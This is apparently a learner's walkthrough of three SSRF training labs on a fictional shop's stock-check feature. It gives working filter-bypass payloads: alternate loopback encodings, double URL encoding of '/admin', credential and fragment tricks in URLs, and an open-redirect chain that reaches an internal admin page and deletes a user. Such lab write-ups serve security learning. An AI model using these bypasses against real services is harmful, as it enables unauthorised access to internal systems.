# Circumventing common SSRF defenses

## Labs #3: SSRF with blacklist-based input filter

> This lab has a stock check feature which fetches data from an internal system.
>
> To solve the lab, change the stock check URL to access the admin interface at http://localhost/admin and delete the user carlos.
>
> The developer has deployed two weak anti-SSRF defenses that you will need to bypass. 

Check stock request 

![3f736c1b35844b75cfa23310e59a0c3f.png](../_resources/e67630be458c47369001090cfce3bdbb.png)


Check stock endpoint

```
http://stock.weliketoshop.net:8080/product/stock/check?productId=1&storeId=1
```


There's three types of error in this application

1. Missing parameter
![0b0cc6e6546a098161ab380641e82115.png](../_resources/012ff7f2b091469493104fcf6db8b0ed.png)

	URL that returns missing parameter error

	- http://stock.weliketoshop.net:8080/


2. Blocked external request
![9db1764171ce1af3f5bf9e1ed26d55d2.png](../_resources/294f165753bc4579902ff3686950514d.png)

	URL that returns blocked external request
	- http://localhost/
	- http://127.0.0.1/

3. Internal server error
![9ba828dcb86dce135baa32fa34d8a284.png](../_resources/0b6faaf4ee7a406e9b78092f10d3c0e3.png)

	URL that returns internal server error  
	- http://[::1]/

List of URLs that bypassed the whitelist

- http://2130706433/
- http://017700000001/
- http://127.1/


Adding `/admin` returns `"External stock check blocked for security reasons"`, means there are 2 step filter.

The first is hostname filter and the second one is any path contains `admin`.

![94ced21ba74b6f3b0edeaf3c990883d3.png](../_resources/fa8c2ad25dbc4875bbc6870f2812be6d.png)


Obfuscating the `/admin` using double url encoding `%2561dmin` successfully bypassed the second filter.

`%2561dmin` => `%61dmin` => `admin`

![2ce9c7b2122f7d8c2e64da32b900df42.png](../_resources/3e3b72b3cdef4be5b9ce529fe23efad2.png)

Delete user carlos with `http://127.1/%2561dmin/delete?username=carlos`

![20c488d561a8e15f48d20a475837ab4b.png](../_resources/11eaef4f3581413dab77dfa745465ae4.png)

## Lab #4: SSRF with whitelist-based input filter

> This lab has a stock check feature which fetches data from an internal system.
> 
> To solve the lab, change the stock check URL to access the admin interface at http://localhost/admin and delete the user carlos.
> 
> The developer has deployed an anti-SSRF defense you will need to bypass. 

Observing how the server handle parse the given URL

![bd7471d20cd1929d859787f58483d43e.png](../_resources/29a9dfad02d842298467d184db5e3efa.png)

Inserting this url to `stockApi` returns the same error
```
http://stock.weliketoshop.net:8080@localhost/
```

![2d26042af9eb98d9bbb591b817132b42.png](../_resources/465efc6debfb4394beab5fb37f7641f0.png)

This means the server url parser read `stock.weliketoshop.net:8080`(green line) as embedded credentials to `localhost` (red line) where

- `stock.weliketoshop.net` is the username
- `8080` is the password

![728c504989f2e9166e2481a6dad12820.png](../_resources/bb76805e03b94b8a8abe3d8a37bd1107.png)

Example of how [PHP function](https://www.php.net/manual/en/function.parse-url.php) parse the following url :
```
http://admin:pass123@google.com:9000/search?q=cat#home
```
- scheme => `http://`
- user => `admin`
- pass => `pass123`
- host => `google.com`
- port => `9000`
- path => `/search`
- query => `q=cat`
- fragment => `home`


By swapping the position between `stock.weliketoshop.net:8080` and `localhost` 

```
http://localhost@stock.weliketoshop.net:8080/
```

The server parse `localhost` as the credential embedded with no password to `stock.weliketoshop.net`.

![b8ca56c55a3f6f90a3440aa42c94ff64.png](../_resources/f691f15d666d4868bf921807b93fc064.png)

Now we can try adding a URL fragment in front of localhost.

From [RFC 3986](https://tools.ietf.org/html/rfc3986#section-3.5):
> *The fragment identifier component of a **URI allows indirect identification** of a **secondary resource by reference** to a primary resource and **additional identifying information*** 
  
Consider the following url:

```
http://localhost#@stock.weliketoshop.net:8080/
```

The server then might parse it to:
- scheme => `http`
- host => `localhost`
- fragment => `@stock.weliketoshop.net:8080`

At this time the `localhost` should be blacklisted by the app, but when it comes to the fragment part, it should be dereferenced by a browser to fetch the additional information

From [Wikipedia](https://en.wikipedia.org/wiki/URL):
> A web browser will usually dereference a URL by performing an HTTP request to the specified host, by default on port number 80. URLs using the https scheme require that requests and responses be made over a secure connection to the website. 

- http://localhost (primary resource)
- stock.weliketoshop.net:8080/ (secondary resource)


With a bit of obfuscation

```
(denied) http://localhost#@stock.weliketoshop.net:8080 
(accepted) http://localhost%2523@stock.weliketoshop.net:8080 
```

![61ae36def1f3ed444bf159db032c17df.png](../_resources/338ecb86367046edb4cbf492fc68c74f.png)

I successfully deleted carlos

![9673d872b1e4ace6d883541b8c9976b1.png](../_resources/549ba68480c64c86aca58fbe7a16ffcc.png)

Experiment checkout the experiment code in scripts folder


## Lab #5: SSRF with filter bypass via open redirection vulnerability

> This lab has a stock check feature which fetches data from an internal system.
>
> To solve the lab, change the stock check URL to access the admin interface at http://192.168.0.12:8080/admin and delete the user carlos.
> 
> The stock checker has been restricted to only access the local application, so you will need to find an open redirect affecting the application first. 

![db9297b407e9624b78ffc36678e8bc8e.png](../_resources/9e062664fa59490a8385ab60cdbeb053.png)

Modify the `path` to force it redirects to `http://192.168.0.12:8080/admin`

![babd7caa509bfe21227a9db97912ff93.png](../_resources/4df0fc3b26b0494292ea86ec65f0b6cd.png)

Unfortunately, the `http://192.168.0.12:8080/admin` won't resolve in my browser because it's on different realm,

Went back to compare stockApi value and the next product value

stockApi:
```
stockApi=/product/stock/check?productId=3&storeId=1
```

nextProduct:
```
/product/nextProduct?currentProductId=3&path=/product?productId=4
``` 

Try to injecting stockApi with nextProduct URI.

```
stockApi=/product/nextProduct?currentProductId=3&path=/product?productId=4
```

It returns "Missing parameter 'path'" error

![03b142c0b7fd31e958e6c38a6b6093b0.png](../_resources/59ea554c73544abc955ae50539a67210.png)

It works after decoded the `&` symbol to `%26`
```
stockApi=/product/nextProduct?currentProductId=3%26path=/product?productId=4

```

![f0dab07eac8aaf74c3dd830f8172c6da.png](../_resources/2a885bd8fa4542569965314469a25786.png)


Successfully loaded the admin page.

![3813d821ea8bf839d4c42b0bc3e62587.png](../_resources/b1f99e993b2b4124ab48497712ada929.png)


Now user `carlos` can be deleted using this payload.

```
stockApi=/product/nextProduct?currentProductId=3%26path=http://192.168.0.12:8080/admin/delete?username=carlos
```